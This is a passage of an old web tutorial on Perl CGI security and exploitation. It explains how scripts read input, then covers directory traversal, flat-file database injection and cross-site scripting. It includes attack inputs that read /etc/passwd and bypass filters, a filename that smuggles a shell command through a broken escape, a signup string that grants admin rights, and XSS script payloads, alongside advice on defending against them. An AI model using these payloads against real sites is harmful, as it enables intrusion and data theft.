
<html>
<head>

  <title>Hacking CGI - by b0iler</title>
 
 
 

</head>
 <body bgcolor="black">
<font color="white"> </font>
<hr color="#808080" width="60%" size="1" noshade=""> 
<Center><font color="white"><font size="4">Hacking CGI - Security
and Exploitation</font></font>
 
<p align="Center"><font color="white">by <a href="mailto:b0iler@hotmail.com">
b0iler</a>
 : <br>
 Written for :<br>
<a href="http://b0iler.eyeonsecurity.net/">http://b0iler.eyeonsecurity.net/</a>
 -  my site full of other cool tutorials<br>
<a href="http://blacksun.box.sk/">http://blacksun.box.sk/</a>
 - a legendary site  full of original tutorials <br></font></p></center>
 
<hr color="#808080" width="70%" size="1" noshade=""> 
<p align="Left"><font color="white">last update May 5th 2002               
<br>
<br>
<i>"Before I enter you to be victims of  my stories, tales, lies, and exaggerations.."</i>
 <br>
<br>
<b><u>Table Of  Contents</u></b><br>
<br>
<a href="#Intro"><b>INTRO</b></a>
<br>
           -Useless babble</font></p>
 
<p align="Left"><font color="white">
<br>
<a href="#CGI_Syntax"><b>CGI SYNTAX</b></a>
<br>
           -<a href="#GET">GET</a>
<br>
          -<a href="#POST">POST</a>
<br>
           -<a href="#CGI">CGI</a>
<br>
          -<a href="#Cookies">Cookies</a>
<br>
           -<a href="#ENV">ENV</a>
<br>
<br>
<a href="#Problems_With_Perl_As_CGI"><b>PROBLEMS WITH PERL AS CGI
</b></a>
</a>
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -<a href="#reverse dir">Reverse 
Directory Transversal</a><br>
           -<a href="#Flat_Databases">Flat Databases</a> <br>
           -<a href="#Cross_Site_scripting">Cross Site scripting</a>
<br>
          -<a href="#SSI">SSI</a>
<br>
           -<a href="#NULL_Byte">NULL Byte</a>
<br>
           -<a href="#Problems_With_Perl_As_CGI">Problems With open()</a><br>
          -<a href="#Perl_Length_Limits">Perl Length  Limits</a><br>
          -<a href="#System_Commands">System Commands</a><br>
           -<a href="#Evaluating_User_Input">Evaluating User Input</a><br>
           -<a href="#Poor_Input_Filtering">Poor Input Filtering</a><br>
<br>
<a href="#Examples_Of_Vulnerable_Scripts"><b>EXAMPLES OF VULN SCRIPTS</b></a>
<br>
           -<a href="#Common_CGI_Exploit_Project">Common CGI Exploits Project</a><br>
           -<a href="#Real_Life_Examples">Real Life Examples</a><br>
           -<a href="#Perlaudit.pl">perlaudit.pl </a>- to help find your own holes<br>
<br>
<a href="#Conclusion"><b>CONCLUSION</b> </a>
<br>
           -<a href="#FAQ_">FAQ</a><br>
          -<a href="#Sources">Sources </a>  <br>
<br>
 </font><a name="Intro"></a>
<a href="#Intro"><font color="white">I[ntro]</font></a> </p>
 
<font color="white"><br>
          Welcome, my name is  b0iler and I will be your guide throughout
this paper.  I hope you are  ready and willing as this next hour or so may
get pretty ugly.  With  introductions out of the way I would like to state
that this is not meant to be  a full guide to teaching people about perl
security.  There is just too  many different ways to exploit perl for one
paper to cover.  This paper is  meant to help people secure their perl when
it is used as CGI, common  programming security flaws, how to exploit them,
how to prevent them, and a  means for me to show people how sexy perl is. 
This paper will not cover  all the aspects of perl security, but will try
to touch on the basics of common  programming vulnerabilities.  This means
I won't mention stuff like how you  should run your scripts at reduced privileges
or how you should have permissions  set correctly on all files, this is just
too much for me to cover..  and  has been covered well by many perl security
tutorials.  This is a perl CGI  paper, covering only common mistakes in people's
code. <br>
<br>
You must already  know a little bit of perl before reading this.  Without
the basic  understanding of open(), subroutines, and regex you will be lost
and I will just  laugh at you.  But only the bare minimum is required.  If
you have  ever read Rain.Forest.Puppy's "<a href="http://phrack.org/show.php?p=55&amp;a=7">
Perl CGI problems</a>
" in Phrack  #55 you will find that this tutorial barrows a lot from that
and many of the  techniques used are covered in that paper.  So why am I
writing this?  Because although that paper was brilliant, it doesn't cover
many problems in CGI  scripts and it is a very hard tutorial for a newbie
to understand.  I will  go a little more slowly in this tutorial and introduce
many new problems I have  found common in CGI scripts.  I plan on covering
the basics of how many CGI  scripts handle input and then cover a lot of
techniques used by attackers to  exploit these CGI scripts. <br>
<br>
CGI stands for Common Gateway Interface and  is used on millions of sites
worldwide.  It allows visitors of websites to  issue commands on the remote
server.  Plain old html is static and doesn't  allow any processing by the
server.  CGI's can completely customize the web  site and gives it a lot
more power, control, and functionality.  CGI  scripts are mostly coded in
perl and to exploit them you should atleast know the  basics of perl and
the operating system it is being ran on.  The more you  know about the factors
at play the easier you will be able to see the flaws in  them.  So if you
know a lot about http (esp headers), perl, and the  operating system you
will be good to go.  CGI scripts are run server side,  which means a client
(you) asks the server to run the script, the server runs  the script and
prints output to the client.  This also means that a CGI  script cannot be
a security concern for the client (you)..  but can be a  big security concern
for the server.  Many big sites with people dedicated  to network security
have had CGI scripts which are vulnerable to an attacker  gaining information
(reading files..  credit card databases, passwords,  company secrets, etc..),
writing to files (adding to databases, defacing  websites, add access to
services, change configuration files, etc..), or even  executing commands
(all of the above and more!). <br>
<br>
Don't be overwhelmed by  this tutorials size or difficulty.  This stuff took
me along time to  learn.  Hours of experimenting, goofing off, auditting
hundreds of scripts,  and reading about perl was required inorder for me
to feel comfortable writing  this.  If you can understand most of the ideas
discussed in this tutorial  in a month you are doing good.  Don't expect
to read it once and know how  to exploit perl, I read RFP's tutorial atleast
a half dozen times before I  understood every bit of it (learning more and
more perl inbetween reads).   Keep this in mind while reading, and please
read this paper more than once.  <br>
<br>
Just to state the obvious, this tutorial does have mistakes.  Take  nothing
I say too seriously and don't use my examples as a guide for proper perl
 coding.  They are probably full of syntax errors and typos.  Any time  I
mention a way of getting around something or doing something there is probably
 another way to do it, which fits perl's slogan (There's More Than One Way
To Do  It).  If I did miss something that is important email me at  b0iler@hotmail.com
 </font>
<h3><font color="white"><a name="CGI_Syntax"></a>
<a name="CGI_Syntax_"></a>
CGI Syntax</font></h3>
<font color="white"><br>
          First of all let me  say that this is not a tutorial to learn CGI
from.  If you do not know how  to code CGI already then this tutorial might
be a little too advanced for  you.  If you don't know perl then close your
web browser right now and buy  a perl book.  If you are rusty with CGI, or
have the basic concepts down it  might be nice to read over a CGI tutorial
or two before continuing.  This  section will just be a brief overview of
all the different ways users submit  data to a CGI script.  If you already
know perl well you may skip over this  section, if not it might be a good
idea to read it.  Maybe you'll learn  something, or it might help keep the
info fresh while you read the rest of the  paper. <br>
<br>
CGI usually requires some form of user input, without this it is  almost
pointless to use a CGI script.  Perl was not built with CGI in mind,  as
the web was not even created yet.  So things get a little hairy for  people
new to perl trying to pick up on how input is sent to the script.   Basicly
there is GET and POST.  These are the two main ways of getting data  from
the user.  There is also Cookies and Environment variables which can  hold
useful information some scripts use to make decisions on.  <br>
<br>
<br>
<b><a name="GET"></a>
GET</b><br>
          GET is the  easiest to understand.  It is data sent in the URL. 
You can see an  example of this whenever you visit a script.cgi file with
?something at the  end.  It is called GET because that is the method used
in the HTTP  requesting, when your browser gets the file from the server
(GET  /cgi-bin/file.cgi HTTP/1.1) Example:  http://b0iler.eyeonsecurity.net/script.cgi?this_is_the_query_string. 
That  ?something is what perl calls the query string, it is stored in  $ENV{'QUERY_STRING'}
and is often handled like this: <br>
</font>
<pre><font color="white">	#script.cgi?sometext  would make $file = 'sometext'<br>	$file = $ENV{'QUERY_STRING'};<br><br>
or when using multiple values: <br></font></pre>
<pre><font color="white">	#script.cgi?some&amp;text  would make $name = 'some' and $file = 'text'<br>	($name, $file) = split(/&amp;/, $ENV{'QUERY_STRING'});<br><br>
or for a more advanced way put values in a hash: <br></font></pre>
<pre><font color="white">	@pair = split(/&amp;/, $ENV{'QUERY_STRING'});<br>	foreach $pair (@pairs){<br>		($name, $value) = split(/=/, $pair);<br><br>		#used to make + into spaces<br>		$value =~ tr/+/ /;<br><br>		#used to convert url encoding (hex) to ascii<br>		$value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;<br><br>		$FORM{$name} = $value;<br>		#script.cgi?name=some&amp;file=text<br>		#would make $FORM{'name'} = 'some' and $FORM{'file'} = 'text'<br>	}<br><br></font></pre>
<font color="white"><br>
Here is a simple example of a GET request.  It would be nice if  you knew
alittle more about HTTP than what I'll explain in this tutorial.   Infact
I am writting an intermediate tutorial on HTTP right after this one is  finished.
<br>
</font>
<pre><font color="white">	GET /script.cgi?some&amp;text HTTP/1.0<br>	<br></font></pre>
<font color="white"><br>
The other basic kind of way users input data is through POST, which  sends
the values in the HTTP header.  Relying on values sent on client side  is
not secure, never think just because you are using POST data that it is any
 safer than GET. <br>
<br>
<br>
<br>
<b><a name="POST"></a>
POST</b><br>
           POST data comes from forms you fill out on webpages and is sent
to the  script as the STDIN.  Some values sent to the script can be hidden,
you  normally cannot veiw or edit these values in a web browser since the
HTTP  requests are kept from the end user.  POST gets it's name from the
HTTP  request method used (POST /cgi-bin/file.cgi HTTP/1.1)  Here is an example
 of an HTML for which would submit 'name' and 'file' data in a POST. <br>
</font>
<pre><font color="white">	&lt;form action="script.cgi" method="post"&gt;<br>	&lt;input type="text" name="name" value=""&gt;<br>	&lt;input type="hidden" name="file" value="profiles.txt"&gt;<br>	&lt;input type=submit value="submit"&gt;<br>	&lt;/form&gt;<br></font></pre>
<font color="white"><br>
And this would be a commonly seen way to handle POST data.  All  form fields
are put into $FORM{'name-of-field'} <br>
</font>
<pre><font color="white">	#read POST data into $buffer<br>	read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});<br>	@pairs = split(/&amp;/, $buffer);<br>	foreach $pair (@pairs) {<br>		($name, $value) = split(/=/, $pair);<br>		#used to make + into spaces<br>		$value =~ tr/+/ /;<br>		#used to convert url encoding (hex) to ascii<br>		$value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;<br>		#this would set $FORM{'name'} = whatever the user put in the text field<br>		#and $FORM{'file'} to profile.txt<br>		$FORM{$name} = $value;<br>	}<br></font></pre>
<font color="white"><br>
Works kinda like the GET, but you use read() to read the STDIN, which  is
sent as content in the POST request.  CONTENT_LENGTH is used to tell the
 script how much to read, this will be included in the POST request.  All
 this works alittle bit different than GET requests do, but the CGI module
works  the same for GET as it does POST.  This makes it alittle more easy
to  remember and nicer to work with.  Many scripts rely on user submitted
data  to make desisions and take actions.  Sometimes the authors trust the
user  not to change hidden form data.  such as changing. <br>
</font>
<pre><font color="white">	&lt;input type="hidden" name="file" value="profiles.txt"&gt;<br>	to<br>	&lt;input type="hidden" name="file" value="/etc/passwd"&gt;<br></font></pre>
<font color="white"><br>
And then submitting the data.  As stated before, POST data is  just sent
with the HTTP request (as content)  This means you can very  easily send
these values yourself with a script or even just telnet.  An  easy method
for beginners is to get proxomitron and edit hidden input  fields.  This
also means you can bypass any kind of client side security,  such as javascript
checks, the http_referrer value, or html (form values).   Never trust data
coming from POST anymore than you would data comming from GET  or anywhere
else, values can be very easily changed by attackers.  Read the  HTTP rfc
for more information on how exactly HTTP works or get proxomitron to  change
html client side.  I prefer learning and knowing things indepth,  which means
doing it by hand with telnet or a script I code and not with  proxomitron. 
Here is a quick example of a POST request: <br>
</font>
<pre><font color="white">	POST /script.cgi HTTP/1.0<br>	Content-Length: 23<br>	Content-Type: application/x-www-form-urlencoded<br>	<br>	value=blah&amp;another=bleh<br></font></pre>
<font color="white"><br>
POST data is a bit harder to do by hand than GET, but taking advantage  of
a programming language things can made fairly simple with a bit of  effort. 
Recieving POST and GET data isn't very hard to do, but it is alot  easier
to let the CGI module handle everything for you.  Also makes your  code a
little easier to read. <br>
<br>
<br>
<b><a name="CGI"></a>
CGI</b><br>
           There is also a very commonly used module for easily handling
GET  and POST data.  This is the CGI module, and is often used like this:
<br>
</font>
<pre><font color="white">	use CGI;<br>	#$value is a new CGI<br>	$value=CGI-&gt;new();<br>	$file = $value-&gt;param('file'); #script.cgi?name=some&amp;file=text<br>	$name = $value-&gt;param('name'); #would make $name = 'some' and $file = 'text'<br></font></pre>
<font color="white"><br>
I would recommend using the CGI modules for your own scripts, it is  easy
to understand and works very well.  Hope you know enough perl to  understand
the above examples.  Lets move on to the other main type of user  input.
<br>
<br>
<br>
<br>
<b><a name="Cookies"></a>
Cookies</b><br>
           Cookies are a small bit of data which sites can put on your computer
inorder to  help identify you or keep records of your visits.  Cookies can
also be left  to javascript or html meta tags.  But you should be aware that
perl can set  cookies (using HTTP Set-Cookie header), and that data can be
sent to a script in  the form of cookies (in HTTP requests).  I will not
bother with an example  of how to set/read cookies.  Cookies aren't quite
used as often as GET and  POST, since they are used in just about every CGI
script.  If you want to  learn try looking into the CGI module and the details
of how cookies work.  <br>
<br>
<br>
<br>
<b><a name="ENV"></a>
ENV</b><br>
          As seen before  with $ENV{QUERY_STRING} and $ENV{'CONTENT_LENGTH'}
the %ENV hash contains many  useful variables that hold information about
the scripts environment.   Since some of these variables can be effected
by user input they need to be  fully understood by anyone coding CGIs or
trying to find vulnerabilities in  CGIs.  Here is a short list of some of
the often abused and helpful in  terms of security ENV variables. <br>
<br>
 </font>
<ul>
 <font color="white">  </font>
  <li><font color="white">REQUEST_METHOD<br>
Type of method the request was made in:  GET, HEAD,    POST, PUT etc..<br>
    <br>
   </font></li>
  <li><font color="white">QUERY_STRING<br>
Any characters after the ? in the GET request (the    url).<br>
    <br>
   </font></li>
  <li><font color="white">REMOTE_HOST<br>
The hostname of the client.  Sometimes server cannot    resolve this, then
it sets REMOTE_ADDR and not this.<br>
    <br>
   </font></li>
  <li><font color="white">REMOTE_ADDR<br>
The IP address of the client.<br>
    <br>
   </font></li>
  <li><font color="white">AUTH_TYPE<br>
How client is authenticated.<br>
    <br>
   </font></li>
  <li><font color="white">REMOTE_USER<br>
Username of authenticated client.<br>
    <br>
   </font></li>
  <li><font color="white">CONTENT_TYPE<br>
When a request has attached data the type of data is set    in this.<br>
    <br>
   </font></li>
  <li><font color="white">HTTP_USER_AGENT<br>
The browser the client is using.<br>
    <br>
    </font></li>
</ul>
<font color="white">Of  course QUERY_STRING is the most abused, but you would
be suprized how often  things like HTTP_USER_AGENT can be misused to cause
the script to do something  it shouldn't.  Most of the others on this list
are there because they can  help make the CGI more secure.  There are alot
more, but I won't bore you  explaining some you will never use and don't
pertain to security at all.   Instead do this to print out all the values
in %ENV <br>
</font>
<pre><font color="white">	while($ename = each(%ENV)){<br>		print "$ename = $ENV{$ename}\n";<br>	}<br></font></pre>
<font color="white"><br>
This section was in no way detailed, if you do not know how HTTP  headers
are sent you should spend some time researching this and other aspects  of
how CGIs work.  I just wanted to get you fimiliar with all the different
 ways users can send data to the script.  Now that we know how we are  sending
data to the scripts, lets see how we can abuse this priviledge and  prevent
others from abusing our stuff. <br>
<br>
 </font>
<h3><font color="white"><a name="Problems_With_Perl_As_CGI"></a>
Problems With Perl As CGI</font></h3>
<font color="white"><br>
          The  reason I call this section "Problems With <u>Perl</u> As CGI"
is because CGI  scripts can be coded in pretty much any language.  Although
they are  commonly coded in Perl.  This is the most important part of this
paper, do  not skip any sections.  Even if you think you know about a subject
I will  be introducing some new techniques and ideas. <br>
<br>
<br>
<br>
<b><a name="reverse dir"></a>Reverse  Directory Transversal</b><br>
          We start our  adventure into the realm of CGI vulnerabilities fairly
simple.  If you know  even the basics of the unix file system and alittle
bit of Perl you will be able  to understand why this is a problem.  It is
a very common vulnerability  called "Reverse Directory Transversal".  Which
means you can move to a  directory which the script is not supposed to access
(the reverse means going  backwards: ../).  This can allow you to read, write,
delete, execute,  etc..  files in a different directory than what was intended. 
Here is  your common open() call: <br>
</font>
<pre><font color="white">	open(FILE, "/home/user/file.txt");<br></font></pre>
<font color="white"><br>
Now the same exact thing but using a variable to determine which file  to
open: <br>
</font>
<pre><font color="white">	$this = '/home/user/file.txt';<br>	open(FILE, "$this");<br></font></pre>
<font color="white"><br>
Both of these open the file /home/user/file.txt and nether of these  are
vulnerable at all.  They are safe from remote attacks.  Now what  happends
if $this is defined by user input? <br>
</font>
<pre><font color="white">	$this = $ENV{'QUERY_STRING'};      #gets the user input into $this<br>	open(FILE, "$this");               #opens that file<br>	@stuff = &lt;FILE&gt;;     #puts contents of that file into @stuff array<br>	close(FILE);<br><br>	print "Content-type: text/html\n\n"; #print html to the client<br>	print "&lt;HTML&gt;&lt;BODY&gt;\n";<br>	print @stuff;<br>	print "&lt;/BODY&gt;&lt;/HTML&gt;";<br></font></pre>
<font color="white"><br>
Now evil_attacker will make QUERY_STRING something like:  /etc/passwd  or
any other file they would like to read on the server.   There is another
way to get to different directories you want to.  Lets say  the author thought
they would be safe to put a hard coded directory before the  inputted file.
<br>
</font>
<pre><font color="white">	$this = '/home/user/';<br>	(undef, $this) .= split(/?/, $ENV{'QUERY_STRING'});<br>	open(File, "$this");<br></font></pre>
<font color="white"><br>
Now you can't simply put /etc/passwd, but you can use ../../etc/passwd  =) 
Most reverse directory transversal exploits will have many ../'s in  them. 
And it is probably the most attempted exploit regarding unknown  CGIs.  Attackers
see script.cgi?file=database.txt and they immediately try  script.cgi?file=../../../../etc/passwd. 
So what if the script has the  following for protection against reverse directory
transversal: <br>
</font>
<pre><font color="white">	$this = '/home/user/';<br>	undef, $this) .= split(/?/, $ENV{'QUERY_STRING'});<br>	$this = s/\.\.\///g; #gets rid of ../ in $this<br>	open(File, "$this");<br></font></pre>
<font color="white"><br>
This looks safe.  But if we know enough about unix and perl regex  we can
see a flaw.  That is .\./.\./etc/passwd =)  In unix you can use  .\./ for
../ so if an attacker inputs .\./.\./file the regex "protection" will  not
see ../ in the string and will not filter it.  So you are thinking  "just
s/\\//g aswell".  Lets look at the following: <br>
</font>
<pre><font color="white">	s~\\~~g;       ( or  s/\\//g; )<br>	s~\.\./~~g;    ( or  s/\.\.\///g; )<br></font></pre>
<font color="white"><br>
that gets rid of ../ and .\./ very well.  To the none security  aware perl
coder they have completed the task, they have filtered these two  types of
reverse directory transversal methods.  Real security programmers  should
always be thinking of possible ways users can evade the filters and do  things
which weren't meant to be done.  So lets really look at what these  two filters
are doing.  They are removing '../' and '\' from a  string.  So something
like 'f\ilter\ed' would become: 'filtered'.  And  '.../...//' would become
'../'  Oh no =)  This is a very exploitable  filter that tons of CGI scripts
use.  Even some "secure" scripts and  programmers use these types of filters
and never think twice about their  security.  I will discuss this method
of evading filters later. <br>
<br>
So  how can you stop attackers from reading/writing to any file on your  system? 
First make sure all key files are chmod'd correctly! There are  webhosts
out there that have files default to 777! Anyone can use a CGI script  to
read/write any file or directory.  You need to atleast set the  permissions
of the index of your site and all scripts and databases so that  nobody abusing
a CGI script can write to it.  If linux ext2 I'd suggest the  chattr command. 
Infact, any index.html that isn't updated often should be  chattr'd and have
a higher privilege than nobody or www.  Also create  index.html, index.shtml,
index.cgi, index.htm and any other possible  extentions.  This will stop
defacers from just creating an index with a  different file extention which
will be the default one before yours.  That  was just a VERY brief warning
to you webmasters out there, but file permissions  is a very key part of
CGI exploitation.  I won't really cover any more  about them other than to
make sure CGI has as little permissions as possible and  to only allow files
which NEED to be accessed by CGI scripts have a low enough  permission to
be read/write by nobody. <br>
<br>
/me slaps b0iler with a "stay on  topic for dummies" book <br>
<br>
To actually secure your scripts you need a good  input subroutine.  Don't
just accept user input, don't just filter user  input, deny user input! Way
too many scripts try to correct user input instead  of deny it.  This is
a great problem.  Even security professionals  make mistakes with regex. 
Another thing is that sometimes perl coders  forget to regex a certain meta
character.  The meta characters are:  &amp;;`'\"|*?~&lt;&gt;^()[]{}$\n\r
and they need to be filtered very carefully  if you are using s//.  Here
is an example from a script I recently looked  at: <br>
</font>
<pre><font color="white">	$filename =~ s/([\&amp;;\`'\|\"*\?\~\^\(\)\[\]\{\}\$\n\r])/\\$1/g;<br>	$filename =~ s/\0//g;<br>	unless (open(FILE, $filename))<br></font></pre>
<font color="white"><br>
If you notice they forgot to filter out \, so when you enter something  like
$filename = touch afile.txt\| it will turn out as touch afile.txt\\| which
 means the \ that is used to escape the meta characters is escaped instead
of the  |.  This error is also in a few perl security papers, so it is fairly
 widespread in scripts.  Again, incase you didn't understand, to exploit
 this filter you can escape their escape on your meta character.  So if  $filename
= '/bin/echo "haha" &gt; file.txt|' it would become /bin/echo "haha"  &gt;
file.txt\|' which would not work.  So try $filename = '/bin/echo  "haha"
&gt; file.txt &gt; blah\|' which will make it become '/bin/echo "haha"  &gt;
file.txt &gt; blah\\|', now the \ that the script is escaping your | with
 is now the character being escaped.  There are many more examples of regex
 not filtering properly.  I will discuss these more indepth later.  I  say
unless you have to (shouldn't be very often) filter input don't.   Instead,
if the user submitted something they shouldn't the script should stop  right
there.  Don't try to correct the problem.  For instance.. if  someone is
inputting a pipe | into the script they are doing something wrong..  probably
trying to hack it.  So why correct this? Just tell them "illegal  characters
detected" and stop.  This makes things such as the two regex  problems listed
above much more pain free and less likely to be  circumvated.  Here is an
example of this: <br>
</font>
<pre><font color="white">	if($file =~ /[\&amp;;\`'\|\"*\?\~\^\(\)\[\]\{\}\$]/) {<br>		&amp;ErrorPageAndLog('illegal characters detected.. you have been logged');<br>	}<br></font></pre>
<font color="white"><br>
This way even if you did forget the \ another meta character will be  spotted
and the error page will be produced anyways.  To filter for \ just  add a
\\ in there.  Now that your eyes are bleeding from regex, lets  continue
to a less hairy problem in perl scripts =) <br>
<br>
<br>
<a name="Flat_Databases"></a>
<br>
<b>Flat  Databases</b><br>
          When I talk about flat  databases I am talking about plain text
files used to store data.  This  could be database.txt, database, file.db,
or any number of others.  Basicly  there are two major problems with using
flat database.  First one we will  cover is a perl problem, second is a misconfiguration
problem. <br>
<br>
Flat  databases need to use someone to break up the input.  For instance,
if a  message board script puts a users name, email address, and message
into  messages.txt it will need to some how keep that data separate when
it reads  it.  It's better explained with an example =) <br>
</font>
<pre><font color="white">	use CGI;<br>	#$input is a new cgi<br>	$input=CGI-&gt;new();<br>	#get GET/POST variables<br>	$name = $input-&gt;param('name');<br>	$mail = $input&gt;param('mail');<br>	$message = $input-&gt;param('message');<br><br>	#print to messages database<br>	open(DB, "&gt;&gt;messages.txt");<br>	print DB "$name|$mail|$message\n";<br>	close(DB);<br></font></pre>
<font color="white"><br>
This will put the 3 inputted variables into messages.txt, each one  seporated
by a |.  When the message board script goes to read the messages  this is
what the code will look like: <br>
</font>
<pre><font color="white">	#read messages database<br>	open(DB, "&lt;messages.txt");<br>	@messages = &lt;DB&gt;;<br>	close(DB);<br><br>	#print html<br>	print "Content-type: text/html\n\n";<br>	print "&lt;HTML&gt;&lt;BODY&gt;\n";<br>	<br>	#loop through all the messages<br>	foreach $msg (@messages){<br>		#split the database fields up<br>		($name, $mail, $message) = split(/\|/, $msg);<br>		print "message by: &lt;a href="mailto:$mail"&gt;$name&lt;/a&gt;\n";<br>		print "&lt;br&gt;&lt;br&gt;\n$message\n&lt;br&gt;&lt;br&gt;\n";<br>	}<br>	print "&lt;/BODY&gt;&lt;/HTML&gt;";<br></font></pre>
<font color="white"><br>
The problem in this should jump out to any attacker.  Even if the  problem
isn't too big a deal in this example.  No user input is filtered or  denied
whatsoever.  And since each variable is seporated by a | and each  post is
on a newline you can submit things like  flood|flood|flood\nflood|flood|flood\nflood|flood|flood\nflood|flood|flood\n
to  post hundreds/thousands of messages. <br>
<br>
With a message board this isn't the  biggest threat, but lets take another
example.  This is a script I found  that puts username|password|visits|user-agent|admin|ipaddress
the admin field is  1 if the user is an admin, 0 if they are a normal user. 
So what happends  when input isn't filtered and someone signs up with the
username of -  b0iler|a|1|linux|1|127.0.0.1|\nfake? that's right..  it sets
their username  as b0iler, password as a, visits to 1, user-agent to linux,
*admin to 1*, and ip  address to 127.0.0.1 then does a line break and prints
fake (which will be  another username ;).  Now I have admin to the script. 
It might go  without saying, but sometimes scripts assume that the admin
of it can be trusted  with input.  I've seen a few dozen scripts where they
secure all normal  input, but have multiple insecurities in the admin section
which can range from  path discloser to full blown command execution.  Also
if you can find out  things like what the admin's password to the script
is, or to .htaccess files  chances are that they use the same password for
the site's ftp/ssh/telnet.   admins, use different passwords for everything
- even users, since you can't  trust admins with not trying your passwords
on your email accounts and  such.  I've heard of someone getting rooted this
way, signing up for a  sight and using their root password there. <br>
<br>
Many scripts will filter  inputted username's and password's and other form
variables, but they don't even  look at user-agent, referrer, or any other
http headers which get printed to the  database! Make sure to filter these
if you use them in the database or to make  any decisions.  Also try to use
just one character for the delimiter, if  you use two then certain filtering
situations can happen which lead to evasion  of your delimitor filter (see
filtering user input section for more details).  <br>
<br>
The other problem I see with flat databases is that the webserver is  misconfigured
to allow clients to read the databases!  This means all you  have to do is
go to http://b0iler.eyeonsecurity.net/cgi-bin/admin/database.txt  to see
the database.  Other file extentions apply besides just .txt, pretty  much
anything not defined in the apache configuration as something different is
 downloadable.  There are several ways to fix this, two simple ones are to
 create this .htaccess and put it in your directory with the database.txt
file:  <br>
</font>
<pre><font color="white">	&lt;Files "*.dat"&gt;<br>	order deny,allow<br>	deny from all<br></font></pre>
<font color="white"><br>
or you could name the database file database.cgi so that when a client  requests
it the webserver sends it through perl first.  Perl will then  create an
error 500 page instead of allowing the client to read the file.   There was
a problem with older php scripts using .inc for includes, which held  sensitive
information and could be read by clients.  So they switched it to  making
includes .php so they are ran through php and not displayed.  But  this also
introduces a new problem..  now php programmers need to be aware  that their
includes can be directly called and will be parsed by the  server.  (sometimes
includes trust that the script including it will have  done something or
that the data it is sending it is safe -- enough about php).  <br>
<br>
You could also name the databases starting with a . which apache will  prevent
people from viewing this file from the web.  Or you could just not  put the
database in a web readable directory.  For example if the website's  root
directory is /home/b0iler.eyeonsecurity.net/public_html/ then put the  database
in /home/b0iler.eyeonsecurity.net/ <br>
<br>
There is also the problem of  having vulnerabilities in other scripts or
services running on the box which  will allow an attacker to read this plain
text file.  With mysql or any  other databases which require a valid login
and password this would prevent this  sort of thing from happening.  Although
I stress that sql is not always the  answer, if you are just going to read
all of the data then sql is just a  waste.  It is ment to speed up sorting/finding
small bits of data from a  large collection.  SQL has alot of power, and
with this power comes  possibility for exploitation.  This type of vulnerability
is called SQL  injection, since you are injecting SQL into the SQL query. 
This attack is  normally very easy to do and requires minimal SQL knowledge
or testing.   Not a whole lot of perl scripts use SQL, but a ton of php scripts
do.  I  may decided to add an SQL injection section to this tutorial on a
later date,  but for now read some sql security/exploitation papers (  http://www.ngssoftware.com/papers/advanced_sql_injection.pdf
).  <br>
<br>
<br>
<br>
<b><a name="Cross_Site_scripting"></a>
Cross Site scripting</b><br>
           Cross Site scripting refers to being able to run script on a clients
 machine as if it came from a site.  Not your own of course - and the script
 shouldn't normally be there.  Most commonly it is user input that is  printted
to the client, but it can come in other forms.  You might also see  it called
CSS which I feel is pretty bad since it confuses people with Cascading  Style
Sheets, so XSS is what I'll call it from now on.  XSS isn't really a  very
dangerous problem in most situations, but as I discussed in detail in my
 hacking with javascript tutorial it can be a security concern for sites
which  store information in cookies.  I don't even really concider it much
of an  exploit unless the script uses cookies to identify a user or users
can do things  once logged in.  In a recent script I found that stores admin
username's  and password's in cookies and allows them to login with just
a cookie you could  proform a cross site scripting attack against the admin
of that site, get his  cookie and then have complete control over the script. 
I also found a  command execution in the admin part of that script, so once
you have the admin  cookie you can execute commands. <br>
<br>
Here is an example to better show what  XSS is and how it works. <br>
</font>
<pre><font color="white">	http://b0iler.com/script.cgi?display=&lt;script type=text/javascript&gt;alert('hello');&lt;/script&gt;<br></font></pre>
<font color="white"><br>
Script.cgi is a perl script that will display the inputted text  somewhere
on the html page it outputs to the client (the user's browser).   This means
the &lt;script type=text/javascript&gt;alert(hello);&lt;/script&gt;  will
get ran by the web browser and will have been ran as if it came from that
 domain.  Therefore has access to cookies and other goodies.  The other  goodies
include the current url which can contain username, passwords, session  ids,
and other sensitive info.  They can redirect users to another script  on
that site or submit data to a script which could do things such as delete
 email, send email, add an admin to the database, steal credit card numbers,
and  virtually anything that a user can do once logged in. <br>
<br>
The most commonly  vulnerable scripts to cross site scripting are shopping
cart scripts and web  email scripts.  Since they require a user to login,
and actions can be  taken depending on what data the user submits.  Web email
scripts also have  the nice feature of being able to send an email with the
javascript in it to  read/delete/send email and change the user password. 
I found this out with  a large script I auditted awhile ago. <br>
<br>
It's hard to point out exactly how  to find cross site scripting vulns. 
But basicly just look for any user  inputted data that is printted directly
to the client without any  filtering.  Also things like message boards that
don't filter html can have  posts with scripting in them.  Here is a very
simple (and common) cross  site scripting problem: <br>
</font>
<pre><font color="white">	use CGI;<br>	#$input is a new CGI<br>	$input=CGI-&gt;new();<br>	$email = $input-&gt;param('email');<br>	#checks for valid email address:  something@something.com<br>	if($email !~ /^(\S+)\@(\S+).(\S+)/){<br>		#prints $email to html, totally unfiltered.<br>		&amp;printhtml("error: $email is not a valid email address"); <br>	}<br>	else{ &amp;processemail("$email"); }<br></font></pre>
<font color="white"><br>
Now if you input something like &lt;script type=text/javascript&gt;  alert(hello);&lt;/script&gt;
as your email address the error message will be  printted to the client and
the javascript will be ran by the browser.  The  most common cross site scripting
attacks focus on redirecting the user to a  script that does something (send
email), steals cookies, or submits form data  automaticly. <br>
<br>
Stopping XSS is not very easy.  You can filter for  &amp; ; # ( ) &lt; and
&gt;.  And also use filtering for things like /, :,  'javascript', and escaping
' and " isn't too bad an idea.  But javascript  can be made so that it can
make strings even without ' or ", so do not trust any  of this filtering
100%. <br>
<br>
Filtering for the string 'script' will not work,  there is spechial encoding
for html which can evade this type of  filtering.  Many scripts which allow
some form of html try to block script  and disallow 'onload', 'onclick',
'onmousover', and other actions which can  execute javascript.  This is extremely
hard to do.  It would be nice  if there was a html tag you could use to make
the browser not parse any  scripting.  Since there isn't you must go through
the pain of filtering or  blocking all possible ways to insert javascript. 
I would say to allow a  very minimum group of characters.  For example only
allow input to contain  A-Za-z0-9.  Nothing else.  Once you try to filter
out only the bad  strings you are left with all sorts of possible ways to
evade the filters and  still print javascript.  One way is that the attacker
could just include  the source of the script with src.  Some examples of
this are: <br>
